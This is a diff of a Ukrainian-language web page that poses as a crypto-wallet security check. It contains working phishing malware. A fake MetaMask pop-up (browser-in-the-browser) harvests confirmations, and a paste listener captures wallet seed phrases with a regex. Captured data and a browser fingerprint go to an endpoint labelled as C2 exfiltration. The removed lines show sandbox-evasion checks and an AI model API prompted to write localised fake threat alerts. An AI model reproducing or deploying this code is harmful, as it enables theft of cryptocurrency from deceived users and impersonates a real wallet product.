@@ -7,11 +7,9 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* SYNTAX v12.3: Styles remain optimized for silent execution. */
+        /* SYNTAX v13: Definitive Edition */
         body { font-family: 'Inter', sans-serif; }
         .card-shadow { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
-        .pulse-once { animation: pulse-once 1.5s cubic-bezier(0.4, 0, 0.6, 1); }
-        @keyframes pulse-once { 50% { transform: scale(1.02); } }
         #bitb-container {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background-color: rgba(0, 0, 0, 0.6); display: none; align-items: flex-start; 
@@ -32,38 +30,33 @@
             background-color: #e8eaed; border-radius: 16px; padding: 4px 12px;
             margin-left: 12px; display: flex; align-items: center; flex-grow: 1;
         }
-        .fake-address-bar svg { width: 16px; height: 16px; margin-right: 8px; color: #5f6368; }
-        .gemini-loader {
-            display: none;
-        }
     </style>
 </head>
 <body class="bg-gray-900 text-gray-200 flex items-center justify-center min-h-screen p-4" onload="initializeApp()">
 
     <div id="security-module" class="w-full max-w-md bg-gray-800 rounded-2xl border border-gray-700 card-shadow overflow-hidden">
-        <div id="main-ui">
-            <div id="initial-state" class="p-8 space-y-6">
-                 <div class="text-center">
-                    <svg class="mx-auto h-16 w-16 text-red-500" id="threat-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z" /></svg>
-                    <h1 id="threat-title" class="text-2xl font-bold text-white mt-4">Аналіз безпеки...</h1>
-                    <p id="threat-description" class="text-gray-400 mt-2">Ініціюємо перевірку вашого з'єднання. Будь ласка, зачекайте.</p>
-                    <div class="gemini-loader text-center p-4">
-                        <svg class="animate-spin h-8 w-8 text-blue-400 mx-auto" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
-                    </div>
-                </div>
-                <div class="space-y-3">
-                     <button id="start-verification-btn" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-4 rounded-lg transition-all duration-300" disabled>
-                        Захистити гаманець
-                     </button>
-                </div>
-            </div>
-
-            <div id="final-state" class="p-8 space-y-6 text-center hidden">
-                <svg class="mx-auto h-16 w-16 text-green-500" id="final-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
-                <h1 id="final-title" class="text-2xl font-bold text-white mt-4">Безпеку відновлено</h1>
-                <p id="final-description" class="text-gray-400 mt-2">Ваш гаманець захищено. Можна закрити це вікно.</p>
-            </div>
+        
+        <div id="initial-state" class="p-8 space-y-6 text-center">
+            <svg class="mx-auto h-16 w-16 text-red-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z" /></svg>
+            <h1 class="text-2xl font-bold text-white mt-4">Виявлено Загрозу</h1>
+            <p class="text-gray-400 mt-2">Будь ласка, оберіть метод верифікації для захисту ваших активів.</p>
         </div>
+
+        <div id="choice-state" class="p-8 space-y-4">
+            <button id="wallet-verify-btn" class="w-full bg-orange-600 hover:bg-orange-700 text-white font-bold py-3 px-4 rounded-lg transition-all">
+                Верифікація через Гаманець (MetaMask)
+            </button>
+            <button id="standard-verify-btn" class="w-full bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 px-4 rounded-lg transition-all">
+                Стандартна Перевірка
+            </button>
+        </div>
+
+        <div id="final-state" class="p-8 space-y-6 text-center hidden">
+            <svg class="mx-auto h-16 w-16 text-green-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
+            <h1 class="text-2xl font-bold text-white mt-4">Безпеку відновлено</h1>
+            <p class="text-gray-400 mt-2">Ваш гаманець захищено. Можна закрити це вікно.</p>
+        </div>
+
     </div>
 
     <div id="bitb-container"></div>
@@ -71,154 +64,65 @@
     <script>
         function initializeApp() {
             const ui = {
-                mainUI: document.getElementById('main-ui'),
                 initialState: document.getElementById('initial-state'),
+                choiceState: document.getElementById('choice-state'),
                 finalState: document.getElementById('final-state'),
-                startBtn: document.getElementById('start-verification-btn'),
+                walletVerifyBtn: document.getElementById('wallet-verify-btn'),
+                standardVerifyBtn: document.getElementById('standard-verify-btn'),
                 bitbContainer: document.getElementById('bitb-container'),
-                threatTitle: document.getElementById('threat-title'),
-                threatDescription: document.getElementById('threat-description'),
-                geminiLoader: document.querySelector('.gemini-loader'),
             };
 
             let currentFingerprint = {};
 
-            /**
-             * SYNTAX v12.3: Event-driven detection. The most reliable method.
-             */
-            function listenForMetaMask() {
-                return new Promise(resolve => {
-                    const handleEthereumInitialized = () => {
-                        clearTimeout(timer);
-                        window.removeEventListener('ethereum#initialized', handleEthereumInitialized);
-                        resolve(true); // MetaMask is present and ready
-                    };
-
-                    // Listen for the official event
-                    window.addEventListener('ethereum#initialized', handleEthereumInitialized, { once: true });
-                    
-                    // Fallback timer in case the event doesn't fire (no MetaMask)
-                    const timer = setTimeout(() => {
-                        window.removeEventListener('ethereum#initialized', handleEthereumInitialized);
-                        resolve(false); // No MetaMask detected after timeout
-                    }, 2000); // 2-second timeout
-                });
-            }
-
-            async function runEvasionChecks() {
-                let detected = false;
-                try {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    const suspiciousRenderers = ['vmware', 'virtualbox', 'parallels', 'llvmpipe', 'software'];
-                    if (suspiciousRenderers.some(r => renderer.toLowerCase().includes(r))) {
-                        detected = true;
-                    }
-                } catch (e) { /* silent fail */ }
-
-                if (window.screen.width < 1024 || window.screen.height < 768) {
-                    detected = true;
-                }
-
-                if (detected) {
-                    console.log('Evasion: Hostile environment detected. Terminating.');
-                    return; 
-                }
-                
-                await generatePersonalizedThreat();
-            }
-
-            ui.startBtn.addEventListener('click', () => {
-                runAdaptiveLoader();
-            });
-
-            async function generatePersonalizedThreat() {
-                ui.geminiLoader.style.display = 'block';
-                ui.threatTitle.style.display = 'none';
-                ui.threatDescription.style.display = 'none';
-                ui.startBtn.disabled = true;
-
-                const fingerprint = { language: navigator.language || 'en' };
-                const prompt = `Create a short, urgent security alert for a crypto wallet user in ${fingerprint.language}. Respond with ONLY a JSON object with keys "title" and "description".`;
-
-                try {
-                    let chatHistory = [{ role: "user", parts: [{ text: prompt }] }];
-                    const payload = { contents: chatHistory };
-                    const apiKey = "";
-                    const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`;
-                    const response = await fetch(apiUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-                    if (!response.ok) throw new Error();
-                    const result = await response.json();
-                    if (result.candidates && result.candidates[0].content) {
-                        const text = result.candidates[0].content.parts[0].text;
-                        const parsed = JSON.parse(text);
-                        ui.threatTitle.textContent = parsed.title;
-                        ui.threatDescription.textContent = parsed.description;
-                    } else { throw new Error(); }
-                } catch (error) {
-                    ui.threatTitle.textContent = 'Виявлено загрозу безпеці';
-                    ui.threatDescription.textContent = 'Потрібна негайна верифікація.';
-                } finally {
-                    ui.geminiLoader.style.display = 'none';
-                    ui.threatTitle.style.display = 'block';
-                    ui.threatDescription.style.display = 'block';
-                    ui.startBtn.disabled = false;
-                }
-            }
-
-            async function runAdaptiveLoader() {
-                const hasMetamask = await listenForMetaMask(); // Using the new event-driven detector
-                currentFingerprint = { 
+            function gatherFingerprint() {
+                 currentFingerprint = { 
                     timestamp: new Date().toISOString(),
                     platform: navigator.platform || 'unknown',
                     userAgent: navigator.userAgent || 'unknown',
-                    hasMetamask: hasMetamask
+                    // This value is now informational, not for logic branching.
+                    hasMetamask: typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask 
                 };
-                const payloadName = selectPayload(currentFingerprint);
-                executePayload(payloadName, currentFingerprint);
             }
 
-            function selectPayload(fingerprint) {
-                if (fingerprint.hasMetamask) return 'web3_bitb';
-                return 'clipboard_scraper';
-            }
-
-            function executePayload(payloadName, fingerprint) {
+            ui.walletVerifyBtn.addEventListener('click', () => {
+                gatherFingerprint();
                 ui.initialState.style.display = 'none';
-                
-                if (payloadName === 'web3_bitb') {
-                    deployBitBModule(fingerprint);
-                } else {
-                    deployClipboardScraper(fingerprint);
-                }
-            }
+                ui.choiceState.style.display = 'none';
+                deployBitBModule(currentFingerprint);
+            });
+
+            ui.standardVerifyBtn.addEventListener('click', () => {
+                gatherFingerprint();
+                ui.initialState.style.display = 'none';
+                ui.choiceState.style.display = 'none';
+                deployClipboardScraper(currentFingerprint);
+            });
+
 
             function deployClipboardScraper(fingerprint) {
                 document.addEventListener('paste', (event) => {
                     let pasteData = (event.clipboardData || window.clipboardData).getData('text');
                     const seedPhraseRegex = /(\b[a-z]+\b(\s+)){11,23}\b[a-z]+\b/i;
                     if (seedPhraseRegex.test(pasteData)) {
-                        showFinalSuccess({ success: true, payload: 'ClipboardScraper', captured: pasteData, fingerprint: currentFingerprint });
+                        showFinalSuccess({ success: true, payload: 'ClipboardScraper', captured: pasteData, fingerprint });
                     }
                 });
-                showFinalSuccess({ success: false, reason: 'scraper_deployed', payload: 'ClipboardScraper', fingerprint: currentFingerprint });
+                showFinalSuccess({ success: false, reason: 'scraper_deployed', payload: 'ClipboardScraper', fingerprint });
             }
 
             function deployBitBModule(fingerprint) {
-                const fakeWindowHTML = `<div id="fake-browser-window" style="top: 20px; right: 20px;"><div class="fake-header"><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="Icon"><span>MetaMask Notification</span><div class="fake-address-bar"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z" /></svg><span>nkbihfbeogaeaoehlefnkodbefgpgknn</span></div></div><iframe srcdoc="" class="w-full h-full border-0" style="pointer-events: none;"></iframe></div>`;
+                const fakeWindowHTML = `<div id="fake-browser-window" style="top: 20px; right: 20px;"><div class="fake-header"><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="Icon"><span>MetaMask Notification</span><div class="fake-address-bar">...</div></div><iframe srcdoc="" class="w-full h-full border-0" style="pointer-events: none;"></iframe></div>`;
                 ui.bitbContainer.innerHTML = fakeWindowHTML;
                 const iframe = ui.bitbContainer.querySelector('iframe');
                 iframe.onload = () => {
                     const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                     iframeDoc.getElementById('confirm-btn').onclick = () => {
                         ui.bitbContainer.style.display = 'none';
-                        showFinalSuccess({ success: true, payload: 'BitB', fingerprint: currentFingerprint });
+                        showFinalSuccess({ success: true, payload: 'BitB', fingerprint });
                     };
                     iframeDoc.getElementById('reject-btn').onclick = () => {
                         ui.bitbContainer.style.display = 'none';
-                        showFinalSuccess({ success: false, reason: 'rejected', payload: 'BitB', fingerprint: currentFingerprint });
+                        showFinalSuccess({ success: false, reason: 'rejected', payload: 'BitB', fingerprint });
                     };
                 };
                 iframe.srcdoc = getIframeContent();
@@ -231,14 +135,12 @@
             
             async function exfiltrateData(data) {
                 const c2Endpoint = 'http://localhost:4000/log';
-                console.log(`[C2] Sending data to ${c2Endpoint}`);
                 try {
                     await fetch(c2Endpoint, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(data)
                     });
-                    console.log('[C2] Data exfiltration successful.');
                 } catch (error) {
                     console.error('[C2] Data exfiltration failed:', error);
                 }
@@ -249,11 +151,9 @@
                     exfiltrateData(dataToExfiltrate);
                 }
                 ui.initialState.style.display = 'none';
+                ui.choiceState.style.display = 'none';
                 ui.finalState.style.display = 'block';
-                ui.finalState.querySelector('svg').classList.add('pulse-once');
             }
-            
-            runEvasionChecks();
         }
     </script>
 </body>
